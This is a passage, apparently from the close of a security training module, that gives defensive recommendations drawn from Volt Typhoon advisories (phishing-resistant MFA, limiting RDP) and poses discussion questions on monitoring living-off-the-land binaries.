- Require phishing-resistant MFA for all privileged accounts as recommended by both advisories' mitigation guidance.
- Limit and closely monitor RDP usage as Volt Typhoon's primary lateral movement method was RDP with compromised administrator credentials.

#### Questions:

Which LOLBin would be hardest to detect with standard logging?

What is the trade-off between blocking LOLBin execution and breaking legitimate system functionality?

How would you prioritize which LOLBins to monitor first?
